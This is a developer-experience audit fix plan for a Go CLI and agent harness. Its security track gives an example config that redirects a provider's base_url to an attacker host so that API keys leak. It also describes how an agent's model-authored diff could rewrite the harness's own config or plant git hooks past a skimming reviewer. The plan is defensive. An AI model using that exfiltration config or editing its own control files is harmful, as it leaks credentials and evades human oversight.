# DX Audit — Fix Plan (v2, post-review)

Source: full 14-stage developer-experience audit of `6b275f5` (verdict **FAIL**, Overall DX 60/100).
Two hard gates fail — `BROKEN_CANONICAL_INSTALL`, `UNEXPLAINED_ERROR` — plus a third P1 of equal
weight (`--json` contract broken, including on state-changing commands).

**v2 supersedes the pre-review draft (`38a77f6`).** Five reviewers rejected or conditioned it; see
[`dx-audit-fix-plan-adversarial-review.md`](./dx-audit-fix-plan-adversarial-review.md). The
diagnoses survived review unchanged. Three central *remedies* did not: the install decision, the
flag parser, and the error-mapping choke point are all rewritten below. The sequencing is inverted.

Every claim carries a file:line from this tree, re-verified after review. Where a v1 claim was wrong,
this text says so rather than quietly fixing it.

## What this plan does and does not claim

It closes both named hard gates and the `--json` contract break. That moves the audit verdict off
**FAIL**.

It does **not** by itself produce a high Overall DX. The audit's highest-weighted area — time to
first value, weight 20 — is barely moved by correctness work; Track V takes a first pass at it and
names the design question it cannot settle alone. The v1 draft claimed this plan converts FAIL to
PASS; that claim was overstated and is withdrawn.

## Constraints

1. **A UI redesign is in flight on `main`** (`web/src/styles.css` modified, `design_handoff_idea_harness_ui/`
   untracked at audit time). Track A2 is the only track that touches its files, and it carries a dated
   fallback rather than an open-ended dependency.
2. **One canonical path** (DX principle). Not "document both install routes better" — make one work.
3. **Each fix is one commit**, `go vet ./...` + `go test ./...` + `scripts/smoke.sh` green before the
   next (CONTRIBUTING §14, §75). **Track A1 exists because this constraint is otherwise unsatisfiable:**
   `internal/cli` → `internal/daemon` (`server.go:14`) → `internal/web` (`//go:embed dist`,
   `web.go:12`), and `.gitignore:20` ignores that directory, so nothing in `internal/cli` compiles on
   a clean checkout.
4. **Every behavior change adds its CHANGELOG entry in the same commit.** Track G0 creates the file
   before any behavior changes, so no fix ships as an undocumented break.
5. **No behavior change without a test that would have caught the bug**, and Track T exists because
   no such test can be written today.

---

## Track A1 — Compile gate (P1, sequence 1)

**Problem (verified).** `.gitignore:20` ignores `internal/web/dist/`; `internal/web/web.go:12` is
`//go:embed dist`. A clean checkout cannot compile *anything* downstream of it:

```
$ go install ./cmd/idea
internal/web/web.go:12:12: pattern dist: no matching files found
$ make test        # same error, [setup failed]
$ make vet         # make: *** [vet] Error 1
```

`README.md:81-83` calls `go install ./cmd/idea` the *recommended* route; `README.md:73-74` says
Node/pnpm is optional "because the binary already embeds a built UI". Both are false for every fresh
clone. CI never sees it because `.github/workflows/ci.yml:19-20` runs `make embed-web` first.

**This track closes the compile half only**, and touches nothing the UI redesign touches.

1. Commit a minimal `internal/web/dist/` (an `index.html` that renders "web UI not built — run
   `make build`" and nothing else). Remove `internal/web/dist/` from `.gitignore`.
2. `//go:embed dist` → `//go:embed all:dist`. The current directive silently drops `.`/`_`-prefixed
   files — a footgun the moment `web/public/` or a `.vite/` manifest appears.
3. `make embed-web` (`Makefile:10-12`) keeps working; it now produces a tracked diff.
4. Fix `README.md:73-74`: Node/pnpm is needed **only to change** the UI. `README.md:180` and
   `docs/architecture.md:22` get a wording clarification (reviewers split on whether they are
   actually wrong — see the review record's disagreement 1).

**Result:** `go build`, `go test`, `go vet` all work with no Node. Every subsequent track can satisfy
constraint 3. The P2 local-dev finding (`make test` fails on a clean clone) closes here, not in a
Makefile hack — reviewers noted `Makefile:13-17` never had an `embed-web` dependency problem; the
missing directory was the whole failure.

**Test:** a CI job in a Node-free container (`golang:1.25-bookworm`) asserting `! command -v node`,
`! command -v pnpm`, then `go build ./... && go test ./...`.

---

## Track G0 — Changelog first (sequence 2)

`CHANGELOG.md` (Keep a Changelog), plus a one-paragraph pre-1.0 versioning policy in `README.md`.
Created **before** any behavior change so Tracks B/C/D cannot ship an undocumented break — the
failure condition of `UNDOCUMENTED_BREAKING_API` (P0), which the v1 sequencing walked into by putting
the changelog six steps after the first breaking change.

---

## Track T — Test harness (prerequisite, sequence 3)

**Problem (verified).** There is no CLI test infrastructure, and the obvious approach forks the test
binary. `connect()` (`internal/cli/cli.go:326-339`) → `ensureDaemon()` (`client.go:162-189`) runs
`os.Executable()` with arg `daemon`; under `go test` that is the *test binary*, so every command
invocation spawns a detached copy and polls 50×100ms before failing. The two existing tests avoid
this only by never reaching `connect()` (`executor_setup_test.go:10-11` says so in a comment;
`docs_test.go:19` hand-constructs a `client`).

1. A client seam: `t.Setenv("IDEA_HARNESS_ADDR", …)` pointed at an `httptest` server, a token file
   under `IDEA_HARNESS_STATE` so `healthy()` short-circuits at `client.go:163`, `t.Chdir` plus a
   `/api/v1/projects` response whose `root_path` matches cwd (`client.go:192-207`). Or a
   `newClientFn` variable. Pick one; both are small.
2. A **store-level** fixture builder — a seeded project with an initiative, a task, and a change set.
   Seeding through the real async workflow costs ~9s (`smoke.sh` budgets 3s per stage) and would blow
   the ~12s suite budget; seeding through the store is milliseconds. Against an *empty* project most
   commands take the "No tasks yet" branch (`advance.go:73`), so a table test would pass
   `json.Valid` while exercising nothing.
3. `colorEnabled` (`style.go:30-38`) is set explicitly in the harness — today it defaults false only
   because no test passes an `*os.File`.

---

## Track B — CLI contract: flags and `--json` (P1, sequence 4)

**Problem (verified).** `resolveInitiative()` (`internal/cli/advance.go:26-28`) returns `args[0]` as
an initiative id with no flag filtering, so `--json` becomes the lookup key. Observed on a fresh
project: `tasks`, `changes`, `risk`, `explain`, `why`, **`advance`** → exit 1
`idea: sql: no rows in result set`; `plan`, `verify` → exit 0 with the flag silently ignored.
`advance` and `execute` are state-changing: a flag typo aims a workflow transition at an initiative
that does not exist.

Call sites: `advance.go:38` (`cmdAdvance`), `:65` (`cmdTasks`), `:158` (`cmdDiff`), `:201`
(`runTraceCmd` → `why`/`impact`/`trace`), `change.go:58` (`cmdExecute`), `:117` (`cmdChanges`),
`:237` (`cmdRisk`), plus `explain_export.go:34` and `watch.go:18` which inline the same defect.

1. **A per-command flag spec** (`name → bool | string | repeated`) consumed by one parser. Not the
   v1 draft's `map[string]string` with a "`-` prefix means flag" rule, which review showed would
   break every value-taking flag in the CLI: `--doc` is repeatable and accumulates into a slice
   (`cli.go:253-258`), the `=` form is accepted (`cli.go:259`, `docs.go:92-95`), and value-taking
   flags are indistinguishable from booleans by prefix alone (`change.go:300-322`, `:402-411`). Under
   the v1 rule the *value* in `--kind omp` becomes a positional and flows into `resolveInitiative` —
   the P1 reintroduced inside its own fix, with `smoke.sh:108` and `executor_setup_test.go:16-18`
   going red. `cmdNew` (`cli.go:250-262`) already implements this shape by hand; the spec generalizes
   existing practice.
2. `resolveInitiative` takes positionals only, **with per-call-site arity**. `runTraceCmd` consumes
   positionals[0:2] itself and passes positionals[2:] (`advance.go:195-201`) — handing it the whole
   slice would start resolving initiative id `"task"`, exercised by `smoke.sh:71,73` every CI run.
3. Every state-returning command honors `--json` or rejects it explicitly — no silent ignore.
   `cmdExplain` gains `wantJSON`/`dumpJSON`. `cmdPlan` (`advance.go:55`) delegates to `cmdExport`,
   which emits markdown: it returns `--json is not supported for plan; use idea tasks --json`.
   Both are behavior changes; both get CHANGELOG entries in this commit (constraint 4).
4. Unknown flags error, naming the command's accepted flags — which requires the registry from item 1.
5. `cmdNext` (`next.go:12`) currently discards `args` entirely; it goes through the same parser.
   `cmdInit` (`cli.go:37`) and `cmdDoctor` (`cli.go:98`) discard `rest` at dispatch — a signature
   change this track must make, not assume.
6. `cmdWatch`'s arg resolution is extracted to a pure function; the command itself terminates in a
   Bubble Tea program and is excluded from the table test.

**Test:** a table over every state-returning command × `--json` against Track T's fixture, asserting
`err == nil` and `json.Valid(stdout)`; a second table asserting an unknown flag errors without
reaching the daemon. ("Exit 0" is `err == nil` — the exit code lives in `cmd/idea/main.go:12-15` and
needs a built-binary subprocess test if it is in scope.)

---

## Track C — Error surfacing (P1 gate, sequence 5)

**Problem (verified).** `idea apply CHG-99` and `idea review CHG-99 approve` answer
`idea: sql: no rows in result set` (exit 1). `cmd/idea/main.go:12-15` prints whatever error reaches it.
A mapping already exists — `changeSetRefError` (`handlers.go:1400-1405`) — and two handlers use it.

**The v1 choke point was wrong.** Mapping inside `s.changeSet` (`:1389`), `s.initiative` (`:1429`)
and `initiativeFromQuery` (`:1440`) does not cover the paths this plan leads with: `idea advance`
leaks through `handlers.go:241-244` (500 + raw text) from `runtime.go:387`; same shape at
`runtime.go:423` and `handlers.go:1143`. Direct `pr.db.Get*` calls bypass all three helpers at
`handlers.go:143, 1143, 1195, 1211`. And `changeSetRefError` returns a **`string`** while the helpers
return `error`.

1. Map at the **store boundary** (or one shared not-found wrapper) covering `runtime.go:387,423,492`
   and the direct handler lookups — not at three helpers.
2. Echo the reference: `no change set matching "CHG-99"`, matching the shape the product already uses
   well (`no requirement matching "REQ-9"`; `no project registered for …; run \`idea init\` first`).
   Strip control characters and truncate to ~64 chars first — `main.go:13` writes daemon strings
   straight to stderr, so an id containing ANSI escapes reflects into the user's terminal. (The web UI
   is not at risk: no `dangerouslySetInnerHTML` in `web/src/`, and `writeError` JSON-encodes.)
3. Not-found is 404. **This is Track F's status-code half, pulled forward** — `handlers.go:243` is a
   500 today, so C cannot claim the gate without it. F's remaining half stays deferred.
4. 5xx bodies become a generic message plus a correlation id, detail logged server-side. The v1 test
   ("no error contains `sql:`") is a substring blocklist that passes on
   `unable to open database file: /Users/<name>/…`; the test asserts the **shape** of 5xx bodies instead.
5. `client.go:137-140` (`doRaw`) prints `daemon: <raw body>`, bypassing the `{"error":…}` decode — a
   second leak path reachable via `idea prd`/`idea export`. Fixed here, not left in Track J.

**Test:** handler tests asserting 404 + friendly body for unknown ids on every `{id}`-taking route;
a CLI test asserting 5xx body shape; the `doRaw` path covered explicitly.

---

## Track S — Security findings (sequence 6)

Three product-level findings the audit did not reach and the v1 plan did not contain. All verified in
this tree.

1. **Provider-key scavenging fails open.** `internal/workflow/execute.go:59-64`: for a bare or unknown
   provider the executor falls back to "the first preset key actually present in the environment", and
   `internal/executor/agent.go:14-20,140-152` forwards that key into a container that *deliberately*
   has network egress (`--network none` intentionally omitted, documented as a filesystem/process
   sandbox). A typo'd `executor.model` hands an unrelated provider's real key to an agent the operator
   did not intend to fund. **Fix:** the fallback returns an empty key-env and the run fails closed with
   a message naming the provider it could not resolve.
2. **`base_url` override of a preset provider is an exfiltration primitive.** `handleUpdateProviders`
   (`handlers.go:283-334`) stores `pc.BaseURL`/`pc.APIKeyEnv` unvalidated; `buildRegistry`
   (`runtime.go:704-705`) registers them over preset defaults. `{"providers":{"openai":{"base_url":
   "https://attacker.tld/v1"}}}` passes every existing check — `rejectSecrets` (`config.go:172-174`)
   rejects inline secrets and a URL is not a secret — then ships `OPENAI_API_KEY` and full prompt
   context there. **Fix:** scheme/host allowlist on the write path (https, plus explicit loopback for
   `ollama`), and an `error`-severity problem when a preset provider's `base_url` is overridden.
3. **`.idea-harness/**` sits inside the ChangeSet-writable surface.** `fsdiff.Snapshot`
   (`internal/fsdiff/fsdiff.go:45-78`) walks the project root with no skip list, so a model-authored
   diff can edit `harness.yaml` — `providers.*.base_url`, `network`, `executor.kind`,
   `build_cmd`/`test_cmd`, `git_commit` — carrying no credential and no path escape, tripping neither
   `secret_sweep` nor `path_escape` in `docs/security-model.md`. The compensating control is the human
   review gate, which is real, and is exactly the kind of diff a reviewer skims.
   **Escalation found while deciding this:** the guard is containment-only
   (`security.ResolveWithin`, `internal/security/fsutil.go:17-42`), so the same hole covers
   **`.git/hooks/**`**. The harness's own commits are safe — `internal/git/git.go:50-56` points
   `core.hooksPath` at an empty temp dir — but the developer's next manual `git commit` runs whatever
   an approved change set left there. Code execution on the developer's machine, from a diff approved
   by skimming.
   **Decided (option A): deny control-plane paths at snapshot time.** `fsdiff.Snapshot`
   (`internal/fsdiff/fsdiff.go:45-78`) skips `.idea-harness/**` and `.git/**`, so an agent's writes
   there never become a change set at all — no rejected-change-set state to handle, and revert
   semantics are untouched. `.gitignore` stays writable: it lives outside `.git/` and is a legitimate
   agent edit. Enforced in the walk, not at apply, so the deny is structural rather than a check a
   later call site can forget.
   **Test:** an agent work root containing `.idea-harness/harness.yaml` and `.git/hooks/pre-commit`
   produces a change set naming neither.
4. `docs/security.md`'s threat table gains rows for all three, plus the UI asset-cache/origin boundary
   from Track A2.

---

## Track D — Config and model validation (P2, sequence 7)

**Problem (verified).** `idea model set bogus/model` → `✓ default model set to bogus/model`;
`idea config validate` → `config: valid`; `idea doctor` → `all checks passed`. `config.Load`
(`internal/config/config.go:178-186`) validates `Network`, `Executor.Kind`, `Review.MaxCycles` — never
that `default_model`'s provider resolves.

1. `Config.Problems() []Problem` (severity `error` | `warn`), scoped to **`Presets ∪ configured
   providers`** — not presets alone. `ResolveProvider` deliberately defaults non-preset providers to
   OpenAI-compatible (`providers.go:70-73`), `providers_test.go:36-38` asserts it, and
   `docs/configuration.md:51-79` documents exactly that for Groq, Together, and LM Studio. The v1 rule
   would have rejected documented, tested configurations.
2. Coverage extends to `harness.executor.model` and `harness.models[*]`, not just `default_model` —
   per Track S1 that is the security-relevant field.
3. `idea config validate` and `cmdDoctor` render it; `cmdDoctor` already calls `config.Load`
   (`cli.go:427`), so it inherits the check.
4. Reject at the write path: `idea model set` and `handleUpdateProviders` refuse an unknown provider
   and an invalid `base_url`, naming what is configured.
5. `config.Load` keeps loading. A wrong config should be reported, not unopenable — turning this into
   a load error would brick an existing project on upgrade.

**Test:** table over `{unknown provider, custom OpenAI-compatible provider, preset with base_url
override, known provider without key, valid}` asserting severity, `model set` exit code, and the
`doctor` line.

---

## Track E — Documentation sync (P2, sequence 8)

`docs/cli.md` documents 16 commands; `internal/cli/cli.go:31-101` dispatches ~38. Missing: `advance`,
`plan`, `tasks`, `execute`, `changes`, `change`, `apply`, `revert`, `review`, `verify`, `next`, `risk`,
`why`, `impact`, `trace`, `diff`, `docs`, `executors`, `cancel`. Four (`risk`, `diff`, `cancel`,
`change <id>`) appear in no document at all. `docs/configuration.md`'s field table omits `git_commit`
(`internal/config/config.go:116`) though README, quickstart, and `docs/ui.md` all reference it.

1. `idea help --format=md` emits the command table; `docs/cli.md` embeds it between markers. The
   generator writes to **stdout** — `cli.go:101-103` sends `help` to `usage(stderr)` today, so a drift
   check against stderr would compare an empty stdout.
2. CI regenerates and `git diff --exit-code docs/cli.md`. Depends on A1 (the generator imports
   `internal/cli`, which does not compile without `dist`).
3. Correct `docs/cli.md:3` — it states the `--json` contract Track B is fixing.
4. Add `git_commit` to `docs/configuration.md`.

---

## Track A2 — Install gate (P1, sequence 9, dated)

The real bytes. Everything here touches files the UI redesign also touches.

1. Commit the real built `internal/web/dist/`, replacing A1's stub. **Keep vite's content hashes.**
   The v1 draft proposed stable filenames for diff reviewability; review rejected it on two
   independent grounds: minified bundles conflict as one unmergeable hunk either way (so stable names
   buy nothing), and a stable asset URL on the fixed loopback origin `127.0.0.1:8787`
   (`client.go:21`) is a **shared browser-cache key** with every other local dev server that has used
   that port — while `web.go:39` substitutes the per-install token into `index.html` and the repo sets
   no CSP. Merge conflicts are handled with `.gitattributes` (`internal/web/dist/** -diff -merge`) and
   a regenerate-after-merge rule in CONTRIBUTING.
2. Caching, corrected: `index.html` gets `Cache-Control: no-store, must-revalidate` (v1 said
   `no-cache`, which still permits writing the token-bearing document to disk). Hashed assets may
   carry a long TTL because the URL is content-addressed. The v1 phrase "max-age keyed off the build
   stamp" was meaningless — `max-age` is a duration, and `embed.FS` entries have zero modtimes, so
   `http.ServeContent` emits neither `Last-Modified` nor `ETag` (`web.go:22`).
3. A CSP on the index response in the same commit: `default-src 'self'; connect-src 'self';
   script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'`.
4. Supply-chain controls, because committing generated bundles creates a review-exempt path into the
   repo (no reviewer diffs a 195 KB bundle): `pnpm install --frozen-lockfile` in `embed-web`
   (`Makefile:10` lacks it; `ci.yml:58` has it for the `web` job), a separate `web-deps-update` target
   for intentional bumps, `packageManager` in `web/package.json`, explicit
   `"pnpm": {"onlyBuiltDependencies": []}` so re-enabling install scripts is a reviewable diff,
   `permissions:` in `ci.yml` (absent today), and `CODEOWNERS` over `internal/web/dist/`,
   `web/package.json`, `web/pnpm-lock.yaml` — directing review at the lockfile, which is readable.
5. Freshness gate: clean-room rebuild, `--frozen-lockfile`, pinned to one runner, then
   **`git status --porcelain -- internal/web/dist` must be empty** — `git diff --exit-code` does not
   see untracked files, so a build emitting a new chunk would have passed green. **The v1 escape hatch
   ("downgrade to a warning if flaky") is struck**: a supply-chain control that fails open is not a
   control. Build once and share the artifact rather than running `pnpm build` twice per CI run.
6. No-Node install job: Node-free container, `! command -v node` / `! command -v pnpm` assertions,
   `go install ./cmd/idea`, daemon on a scratch `IDEA_HARNESS_STATE`/`IDEA_HARNESS_ADDR`, poll for
   health with a deadline, assert `GET /` is 200 with the app root element.

**Dated checkpoint:** if the UI redesign has not merged by **2026-09-16**, A2 proceeds against `main`
and the redesign rebases. The v1 draft left this open-ended, which left the audit's top gate open
indefinitely.

---

## Track G — Version and releases (P2, sequence 10)

**The v1 premise was wrong.** A version already exists: `const version = "0.1.0"`
(`internal/daemon/handlers.go:27`), served at `GET /api/v1/version` (`routes.go:7`). What is missing is
a CLI command and any relationship between that constant and the build.

1. One stamp, read by both `idea version` and `handleVersion` — replacing the constant, not adding a
   third source.
2. Three build paths, stated explicitly: `make build` (ldflags `-X`, plus `-trimpath` so the binary
   does not embed the maintainer's home path, readable via `go version -m`); `go install ./cmd/idea`
   from a checkout (`vcs.revision` + `vcs.modified` → a dirty tree must render `-dirty` or the command
   lies); `go install <module>@<version>` from the proxy (`Main.Version` only, **no** VCS data). Say
   which wins when only one is present.
3. **The module path does not resolve.** `go.mod:1` declares `module github.com/idea-harness/idea-harness`;
   `origin` is `devarispbrown/idea-harness`. No tag makes `go install <module>@v0.1.0` work.
   **Decided (option A): rename the module to `github.com/devarispbrown/idea-harness`** — a mechanical
   rewrite of every import, free today because there are no tags and no consumers, and a breaking
   change the moment either exists. So it lands before the first tag, not after. README continues to
   name clone + `go install ./cmd/idea` as canonical: the module-path form additionally requires the
   repository to be public (it currently 404s unauthenticated), which is a separate decision this
   plan does not make.
4. Release automation before the first tag — goreleaser or an equivalent workflow, binaries built in
   CI, not on a laptop. `v0.1.0` is cut **after** A2, so the first release is one where the documented
   install works.

**Test:** anchored smoke assertion on `idea version`, including the `-dirty` marker.

---

## Track H — Testing the surface the product is (P2, sequence 11)

Track T built the harness; this track spends it. Golden-output tests per command for both renderers,
and `scripts/smoke.sh` waits on state rather than the clock.

Corrected line numbers (v1's were wrong): fixed sleeps are `smoke.sh:52, 67, 78, 85`, plus an uncited
`sleep 1` at `:102`. Concretely: `:52` → poll `idea status` until the badge leaves `running`; `:67` →
poll `idea tasks` until it stops printing "No tasks yet"; `:78` → poll `idea changes` for `CHG-1`;
`:85` → poll for `hello.txt` (the `test -f` at `:87` runs before the existing git poll — that is the
real race); `:102` → absence has no positive signal, so poll `idea change CHG-1` until it reports
reverted, then assert absence. Every converted poll gets `|| { echo …; exit 1; }` — the health loops
at `:25-28` and `:45-48` that v1 cited as already-correct never fail on timeout; they fall through and
the next command errors with an unrelated message.

**macOS CI is dropped unless someone names what it catches.** GitHub macOS runners have no Docker, so
`internal/executor/sandbox_test.go:16-19` and `internal/workflow/execute_test.go:292,324` would skip —
a green macOS job reading as coverage it does not have. No file in `internal/executor` or
`internal/fsdiff` branches on `runtime.GOOS`. The audit ran on darwin/arm64 and CI never has; that is
a real gap, but the fix is a named darwin-specific test, not a matrix entry.

---

## Track V — Time to first value (sequence 12)

The audit's highest-weighted area (20) and the one no other track touches. The magic path costs 13
commands against a target of 8, and the out-of-box outcome is synthetic by design (demo mode plus the
internal placeholder executor).

**Decided (option A): `idea next --until-human`.** `cmdNext` (`internal/cli/next.go:12-40`) runs
exactly one step and returns; `--until-human` loops — ask `/next`, run the step, wait for the
operation, repeat — and stops at `review` / `apply` / `resolve` / done. The rejected alternative was
`idea new` driving straight through to the first human gate: one command better, but it spends model
budget through design and implementation before the human has read a word of the PRD, which
contradicts the posture the product is built on ("the human decides what matters").

Because `advance` and `execute` are async, the loop waits on the operation the way `idea watch` does —
so `--until-human` also absorbs the separate `idea watch` call rather than adding to the count.

**The count only moves if the docs move.** The audit measured `README.md`'s quick start, not the
theoretical minimum, so that block is rewritten around `next --until-human` in the same commit:
`init` → `model set` → `new` → `next --until-human` → `review` → `apply` → `verify` → `next` = 8,
against a target of 8. The target is P2 guidance, not the point; the point is deleting the "what do I
run now" burden.

Track I's framing is corrected too: documenting and timing the real-model path in `docs/quickstart.md`,
with the existing opt-in `agent` CI tier (`ci.yml:68-92`) recording elapsed time via `SECONDS` and
emitting **only the number** — never `daemon.log` (`agent-smoke.sh:35`), whose model output can carry
secrets outside the redactor's catalog. Add `permissions: contents: read` and
`persist-credentials: false` to that job. This makes the real path *measurable*; it does not make it
the *default*, and per the DX standards an estimate cannot prove a gate PASS.

---

## Track J — P3 batch (sequence 13)

`idea apply CHG-1` on an already-applied set returns `✓ apply started` with no idempotency signal ·
`idea status` on a complete initiative still prints `→ Resolve open questions` · no HTTP API reference
in `docs/` · `idea plan <initiative>` and `idea export` ignore the initiative entirely
(`explain_export.go:76-97` picks the last artifact in the *project* matching `kind` — a real
multi-initiative correctness bug, filed here, not scheduled).

---

## Out of scope

Route unification and the `next`/`next-move` rename (`routes.go:25-29` vs `:66,72`; `:65` vs `:17`) —
breaking, and colliding with the UI redesign; its own plan after that lands · SDKs · OpenAPI
generation · anything in `web/src` · the `idea watch` exit-code claim, which the audit could not
reproduce headlessly and is recorded as source-based only.

## Sequencing

| # | Track | Why here |
|---|---|---|
| 1 | A1 compile gate | Nothing downstream of `internal/web` compiles without it; unblocks every test loop |
| 2 | G0 changelog | Must exist before the first behavior change |
| 3 | T test harness | B, C, D all need it; naive tests fork the test binary |
| 4 | B flag parsing | The P1 with the widest blast radius |
| 5 | C error surfacing + 404s | Second P1; carries Track F's status-code half |
| 6 | S security | Fails-open credential path outranks the cosmetic backlog |
| 7 | D config validation | Depends on S1 for scope |
| 8 | E doc generation | Depends on A1 to compile the generator |
| 9 | A2 install gate | Dated 2026-09-16; the only track that collides with the redesign |
| 10 | G version + releases | After A2, so the first tag is installable |
| 11 | H testing | Spends the harness from T |
| 12 | V time to first value | Needs a design decision first |
| 13 | J P3 batch | Polish |

## Definition of done

- Tracks A1, G0, T, B, C, S, D, E, A2, G, H landed; V and J landed or deferred with a dated note.
- `go vet ./...`, `go test ./...`, `bash scripts/smoke.sh`, `cd web && pnpm build && pnpm test` green.
- The four new CI jobs pass: Node-free compile (A1), Node-free install + `GET /` 200 (A2), `dist`
  freshness via `git status --porcelain` (A2), `docs/cli.md` drift (E).
- Mechanically checkable gate closure: `go install ./cmd/idea` succeeds on a clean checkout with no
  Node; `--json` returns valid JSON with `err == nil` on every state-returning command; no CLI error
  is a raw store error and every 5xx body carries a correlation id.
- Track S3's product decision recorded in `docs/security.md`, either way.
- A re-audit is a **separate** exercise. Per the DX standards a verdict needs all nine areas scored
  with evidence labels; this plan's DoD proves gate closure, not a score. The v1 draft conflated the
  two.
